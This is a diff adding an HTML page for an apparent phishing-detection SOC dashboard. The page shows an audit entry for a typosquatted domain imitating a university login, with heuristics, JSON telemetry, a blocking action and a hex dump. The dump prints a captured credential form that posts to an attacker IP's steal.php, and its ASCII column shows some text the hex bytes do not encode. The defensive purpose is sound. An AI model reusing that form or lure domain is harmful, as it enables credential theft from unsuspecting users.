@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhishShield SOC // In-Depth Audit Log Telemetry Inspector</title>
+    <style>
+        :root {
+            --bg-base: #080203;
+            --bg-card: #120507;
+            --border-red: #ff1e43;
+            --border-dim: #4a0d17;
+            --text-red: #ff2e4d;
+            --text-glow: #ff556e;
+            --text-dim: #a34854;
+            --text-muted: #5e2830;
+            --accent-green: #00ff66;
+            --font-mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-mono);
+        }
+
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-red);
+            padding: 15px;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid var(--border-red);
+            background: var(--bg-card);
+            padding: 10px 20px;
+            margin-bottom: 15px;
+        }
+
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-dim);
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .card-header {
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            border-bottom: 1px solid var(--border-dim);
+            padding-bottom: 8px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        nav a {
+            color: var(--text-dim);
+            text-decoration: none;
+            text-transform: uppercase;
+            font-size: 11px;
+            font-weight: bold;
+            padding: 5px 10px;
+        }
+
+        nav a:hover, nav a.active {
+            color: var(--text-glow);
+            border: 1px solid var(--border-red);
+            background: rgba(255, 30, 67, 0.1);
+        }
+
+        .code-block {
+            background: #000;
+            border: 1px solid var(--border-dim);
+            padding: 12px;
+            color: var(--text-glow);
+            font-size: 11px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .status-tag {
+            background: rgba(255, 30, 67, 0.2);
+            color: var(--border-red);
+            padding: 2px 8px;
+            border: 1px solid var(--border-red);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div style="font-weight: bold; letter-spacing: 2px;">
+            [+] AUDIT LOG INSPECTOR // ENTRY #AUD-99020
+        </div>
+        <nav>
+            <a href="index.html">&lt; RETURN TO MAIN COMMAND CENTER</a>
+            <a href="audit_log_details.html" class="active">02. AUDIT STREAM LOGS</a>
+            <a href="mitre_matrix.html">03. MITRE ATT&CK MATRIX</a>
+        </nav>
+    </header>
+
+    <div class="card">
+        <div class="card-header">
+            <span>FORENSIC EXAMINATION DEEP DIVE: SCAN ID #AUD-99020</span>
+            <span class="status-tag">THREAT LEVEL: CRITICAL MALICIOUS (98.4%)</span>
+        </div>
+
+        <div class="grid-2">
+            <div>
+                <h4 style="color: var(--text-glow); margin-bottom: 8px;">TARGET VECTOR METADATA</h4>
+                <p><strong>Target URL:</strong> [http://login-presidencyuniveristy-auth.ru/login.php](http://login-presidencyuniveristy-auth.ru/login.php)</p>
+                <p><strong>Resolved IP:</strong> 185.220.101.5 (Known Cybercrime Host Node)</p>
+                <p><strong>Geolocation:</strong> Host Provider: Off-shore Anonymous Host, RU</p>
+                <p><strong>Scan Ingestion Time:</strong> 2026-09-25 11:08:44 UTC</p>
+                <p><strong>User-Agent Used:</strong> Mozilla/5.0 (X11; Linux x86_64) PhishShield Threat Crawler v4.0</p>
+            </div>
+            <div>
+                <h4 style="color: var(--text-glow); margin-bottom: 8px;">HEURISTIC ANOMALY BREAKDOWN</h4>
+                <p><strong>Typosquatting Distance:</strong> Levenshtein Distance = 1 (Targeting presidencyuniversity.in)</p>
+                <p><strong>Entropy Score:</strong> 4.82 Bits/Char (High Structural Randomness)</p>
+                <p><strong>Punycode Flag:</strong> False</p>
+                <p><strong>SSL/TLS Status:</strong> Invalid / Self-Signed Certificate Detected</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- RAW JSON PAYLOAD STREAM -->
+    <div class="card">
+        <div class="card-header">
+            <span>RAW TELEMETRY JSON DATASTREAM</span>
+        </div>
+        <div class="code-block">
+{
+  "audit_event_id": "AUD-99020",
+  "timestamp": 1790315324,
+  "target_heuristic": {
+    "raw_url": "[http://login-presidencyuniveristy-auth.ru/login.php](http://login-presidencyuniveristy-auth.ru/login.php)",
+    "domain": "login-presidencyuniveristy-auth.ru",
+    "tld": ".ru",
+    "typosquat_target": "presidencyuniversity.in",
+    "similarity_score": 0.96
+  },
+  "threat_analysis": {
+    "risk_score": 0.984,
+    "verdict": "MALICIOUS_PHISHING_GATEWAY",
+    "mitre_attack": {
+      "tactic": "Initial Access",
+      "technique_id": "T1566.002",
+      "technique_name": "Spearphishing Link"
+    }
+  },
+  "network_response": {
+    "http_status": 200,
+    "header_dump": {
+      "Server": "nginx/1.18.0",
+      "Content-Type": "text/html; charset=UTF-8",
+      "X-Frame-Options": "SAMEORIGIN"
+    }
+  },
+  "playbook_execution": {
+    "action": "AUTOMATED_DNS_BLACKHOLE",
+    "firewall_rule_added": "IPTABLES_BLOCK_185.220.101.5"
+  }
+}
+        </div>
+    </div>
+
+    <!-- HEX / DOM DUMP -->
+    <div class="card">
+        <div class="card-header">
+            <span>INSPECTED FORM ACTION CAPTURE & PAYLOAD HEX DUMP</span>
+        </div>
+        <div class="code-block" style="color: #a34854;">
+00000000  3c 21 44 4f 43 54 59 50  45 20 68 74 6d 6c 3e 0a  |<!DOCTYPE html>.|
+00000010  3c 68 74 6d 6c 3e 3c 68  65 61 64 3e 3c 74 69 74  |<html><head><tit|
+00000020  6c 65 3e 50 72 65 73 69  64 65 6e 63 79 20 55 6e  |le>Presidency Un|
+00000030  69 76 65 72 73 69 74 79  20 50 6f 72 74 61 6c 3c  |iversity Portal<|
+00000040  2f 74 69 74 6c 65 3e 3c  2f 68 65 61 64 3e 3c 62  |/title></head><b|
+00000050  6f 64 79 3e 3c 66 6f 72  6d 20 61 63 74 69 6f 6e  |ody><form action|
+00000060  3d 22 68 74 74 70 3a 2f  2f 31 38 35 2e 32 32 30  |="[http://185.220](http://185.220)|
+00000070  2e 31 30 31 2e 35 2f 73  74 65 61 6c 2e 70 68 70  |.101.5/steal.php|
+00000080  22 20 6d 65 74 68 6f 64  3d 22 50 4f 53 54 22 3e  |" method="POST">|
+        </div>
+    </div>
+
+</body>
+</html>
